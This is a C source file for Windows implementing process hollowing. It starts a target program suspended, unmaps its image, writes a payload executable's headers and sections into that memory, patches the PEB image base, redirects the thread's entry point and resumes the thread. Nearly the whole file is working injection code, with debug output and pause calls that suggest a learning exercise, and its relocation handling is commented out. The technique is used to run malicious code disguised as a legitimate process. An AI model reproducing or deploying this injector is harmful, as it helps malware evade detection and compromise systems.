#include "processHollowing.h"

int _tmain(int argc, _TCHAR* argv[])
{
	int returnCode = 0;
	
	if (argc > 2) {
		fprintf(stderr, "*** Hello in Process Hollowing ! ***\n");
		returnCode = _CreateProcess(argv[1], argv[2]);
	}
	else {
		fprintf(stderr, "**** Usage : [Tech]ProcessHollowing.exe <pathTarget.exe> <pathPayload.exe> ****\n");
	}
//	returnCode = _CreateProcess(L"C:\\Windows\\System32\\mspaint.exe",L"C:\\Windows\\System32\\cmd.exe");
	return returnCode;
}

int _CreateProcess(LPCWSTR targetPath, LPCWSTR sourcePath)
{
	int returnCode = 0;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	PAYLOADFILE payload;

	ZeroMemory(&si, sizeof(STARTUPINFOW));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
 
	/* STEP 1 : Create process in suspended mode */

	if (!CreateProcessW(targetPath, NULL, 0, 0, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 0, 0, &si, &pi))
		EXIT_WITH_ERROR("/!/ CreateProcessW failed !");

	fprintf(stderr, "*** Step 1 :  CreateProcess in suspended succeeded ! ***\n");

	//system("pause");

	/* STEP 2 : Read payload */
	
	returnCode = ReadPayload(sourcePath, &payload);
	
	//system("pause");

	/* STEP 3 : UnMap memory of target and inject payload */
	if (returnCode == 0)
		UnMapAndInject(&pi, payload.lpBuffer, payload.payloadSize);


	/* Clean up */
	
	UnmapViewOfFile(payload.lpBuffer);
	CloseHandle(payload.hmapFile);
	CloseHandle(payload.hpayloadFile);

	NtTerminateProcess(pi.hProcess, 1);
	return returnCode;
}

int ReadPayload(LPCWSTR sourcePath, PPAYLOADFILE payload)
{
	memset(payload, 0, sizeof(PAYLOADFILE));

	payload->hpayloadFile = CreateFile(sourcePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (payload->hpayloadFile == INVALID_HANDLE_VALUE)
		EXIT_WITH_ERROR("/!/ Error with handle of payload file !");

	fprintf(stderr, "*** Step 2 :  Read payload succeeded ! ***\n");

	payload->payloadSize = GetFileSize(payload->hpayloadFile, NULL);

	if (!payload->payloadSize)
		EXIT_WITH_ERROR("/!/ GetFileSize failed !");

	payload->hmapFile = CreateFileMapping(payload->hpayloadFile, NULL, PAGE_READONLY | SEC_COMMIT, 0, payload->payloadSize, NULL);

	if (!payload->hmapFile)
		EXIT_WITH_ERROR("/!/ CreateFileMapping failed !");

	fprintf(stderr, "	*** CreateFileMapping succeeded ! , hmapfile = %p, size = %ld ***\n", payload->hmapFile, payload->payloadSize);
	
	payload->lpBuffer = MapViewOfFile(payload->hmapFile, FILE_MAP_READ, 0, 0, 0);

	if (!payload->lpBuffer)
		EXIT_WITH_ERROR("/!/ MapViewOfFile failed !");

	fprintf(stderr, "	*** MapViewOfFile succeeded ! , lpBuffer = %p ***\n",payload->lpBuffer);

	return 0;
}

int UnMapAndInject(LPPROCESS_INFORMATION pPi, PVOID buffer, DWORD sizeBuffer)
{
	PEB peb;
	CONTEXT contextThread;
	DWORD oldProtect;
	LPVOID pIBA;
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;
	
	/* Get the context of the main thread */

	ZeroMemory(&contextThread, sizeof(CONTEXT));
	contextThread.ContextFlags = CONTEXT_FULL;

	fprintf(stderr, "	*** Handle process = 0x%x ***\n", pPi->hProcess);

	if (!GetThreadContext(pPi->hThread, &contextThread))
		EXIT_WITH_ERROR("/!/ GetThreadContext failed !");

	fprintf(stderr, "*** Step 3 :  GetThreadContext succeeded, RIP : 0x%x  RDX : 0x%x ***\n ", contextThread.Rip, contextThread.Rdx);

	//system("pause");

	/* Read PEB of the target */

	if (!ReadProcessMemory(pPi->hProcess, (LPCVOID) contextThread.Rdx, (LPVOID)&peb, sizeof(peb), NULL))
		EXIT_WITH_ERROR("/!/ ReadProcessMemory failed !");
	
	fprintf(stderr, "	*** ReadProcessMemory succeeded ! Image Base Address : %p ***\n", peb.Reserved3[1]);

	//system("pause");

	/* Get Header */

	pDosH	=	(PIMAGE_DOS_HEADER)buffer;
	pNtH	=	(PIMAGE_NT_HEADERS)((LPBYTE)buffer + pDosH->e_lfanew);

	fprintf(stderr, "	*** Get Header, nbr of section = %d , subsytem payload = %u ***\n", pNtH->FileHeader.NumberOfSections, pNtH->OptionalHeader.Subsystem);

	if(pNtH->OptionalHeader.Magic != 0x20b)
		EXIT_WITH_ERROR("Payload isn't 64bit ! ");
	
	//system("pause");

	/* Unmap the target at PEB */

	NtUnmapViewOfSection _ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");

	if (_ntUnmapViewOfSection(pPi->hProcess, peb.Reserved3[1]) != 0)
		EXIT_WITH_ERROR("/!/ NtUnmapViewOfSection failed !");

	fprintf(stderr, "	*** NtUnmapViewOfSection succeeded at 0x%x ***\n", peb.Reserved3[1]);

	/* STEP 4 : Allocate new memory and write each sections */ 
	
	pIBA = VirtualAllocEx(pPi->hProcess, peb.Reserved3[1], pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	fprintf(stderr, "*** Step 4 : Write Payload,  New pIBA = 0x%x ***\n", pIBA);

	if (!pIBA)
		EXIT_WITH_ERROR("/!/ Error allocate in pIBA !");

	DWORD64 deltaIBA = (DWORD64)pIBA - pNtH->OptionalHeader.ImageBase;
	
	//
//	pNtH->OptionalHeader.ImageBase = (DWORD64)pIBA;

	fprintf(stderr, "****[DEBUG] Source Image base : 0x%p \r \n, Destination Image Base : 0x%p \r \n Delta IBA : 0x%p \r \n",pNtH->OptionalHeader.ImageBase, pIBA, deltaIBA);

	system("pause");

	/* STEP 5 : Write Payload */

	//Write the payload headers to the allocated memory in suspended Process

	if (!WriteProcessMemory(pPi->hProcess, pIBA, buffer, pNtH->OptionalHeader.SizeOfHeaders, NULL))
		EXIT_WITH_ERROR("/!/ Error to write headers ! ");

	for (int i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {

		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		fprintf(stderr, "	\n*** Section %s : ***\n", pSecH->Name);
		fprintf(stderr, "	*** Virtual Address : 0x%x ***\n", pSecH->VirtualAddress);
		fprintf(stderr, "	*** Raw Size : %d ***\n", pSecH->SizeOfRawData);
		fprintf(stderr, "	*** Pointer to raw data : 0x%x ***\n", pSecH->PointerToRawData);
		fprintf(stderr, "	*** Characteristics : %x ***\n", pSecH->Characteristics);

		if (!WriteProcessMemory(pPi->hProcess, (LPVOID)((LPBYTE)pIBA + pSecH->VirtualAddress), (LPVOID)((LPBYTE)buffer + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL))
			EXIT_WITH_ERROR("/!/ WriteProcessMemory Section failed ! ");
			
		VirtualProtectEx(pPi->hProcess, (LPVOID)((LPBYTE)pIBA + pSecH->VirtualAddress), pSecH->Misc.VirtualSize, pSecH->Characteristics & 0xFFF, &oldProtect);

	}

	system("pause");

	/*
	if (deltaIBA) {
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS));
		fprintf(stderr, "*** Relocating the relocation table ... *** \n");
		for (int i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {

			pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

			BYTE* relocSecName = (BYTE*)".reloc";

			if (memcmp(pSecH->Name, relocSecName, 5) != 0) {
				continue; // if the section is not the ".reloc" Section continue to the next section
			}
		}

		//Get the address of the section Data 
		DWORD relocAddress = pSecH->PointerToRawData;
		IMAGE_DATA_DIRECTORY relocTable = pNtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		DWORD relocOffset = 0;

		while (relocOffset < relocTable.Size) {
			PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((LPBYTE)buffer + relocAddress + relocOffset);
			fprintf(stderr, "**[DEBUG] reloc block 0x%x. Size : 0x%x\n", relocBlock->pageAddress, relocBlock->blockSize);

			relocOffset += sizeof(BASE_RELOCATION_BLOCK);
	//			
			DWORD relocEntryCount = (relocBlock->blockSize - sizeof(BASE_RELOCATION_BLOCK) / sizeof(BASE_RELOCATION_ENTRY));
	//			
			fprintf(stderr, "relocEntryCount = %d , relocOffset : %d < relocTable.Size : %d\n", relocEntryCount,relocOffset, relocTable.Size);

			PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((LPBYTE)buffer + relocAddress + relocOffset);

			for (int x = 0; x < relocEntryCount; x++) {

				relocOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocEntries[x].type == 0)
					continue;

				DWORD patchAddr = relocBlock->pageAddress + relocEntries[x].offset;
				DWORD64 entryAddress = 0;

				if(!ReadProcessMemory(pPi->hProcess, (PVOID)((DWORD64)pIBA + patchAddr), &entryAddress, sizeof(PVOID), 0))
					EXIT_WITH_ERROR("Error reloc ReadProcessMemory ");
				
				//fprintf(stderr, "*** [DEBUG] 0x%llx --> 0x%llx | At : 0x%llx \n", entryAddress, entryAddress + deltaIBA, (PVOID)((DWORD64)pIBA + patchAddr));

				entryAddress += deltaIBA;

				if (!WriteProcessMemory(pPi->hProcess, (PVOID)((DWORD64)pIBA + patchAddr), &entryAddress, sizeof(PVOID), 0))
					EXIT_WITH_ERROR("Error reloc fin ");
					
			}
		}

		fprintf(stderr, "*** [DEBUG] reloc fin ! \n");

	}
	
	*/
	// Write the new Image Base Address

	if (!WriteProcessMemory(pPi->hProcess, (LPVOID)(contextThread.Rdx + FIELD_OFFSET(PEB, Reserved3[1])), (LPVOID)&pIBA, sizeof(LPVOID), NULL))
		EXIT_WITH_ERROR("/!/ Error WriteProcessMemory new PEB !");

	system("pause");

	/* STEP 6 : Set thread Context*/

	contextThread.Rcx = (SIZE_T)((LPBYTE)pIBA + pNtH->OptionalHeader.AddressOfEntryPoint);

	fprintf(stderr, "*** Step 5 : Set thread context, Entry Point : %#zx ***\n", contextThread.Rcx);

	if (!SetThreadContext(pPi->hThread, (PCONTEXT)&contextThread))
		EXIT_WITH_ERROR("/!/ Error SetThreadContext ! ");

	fprintf(stderr, "	*** Set Thread Context succeeded ! ***\n");

	system("pause");

	//TODO : Resume thread bug with some programs in payload (crash of app), because 64bit ?  Works with cmd.exe in payload ! 

	ResumeThread(pPi->hThread);

	fprintf(stderr, "*** Step 6 : Resume Thread succeedeed ! ***\n");

	system("pause");

	return 0;
}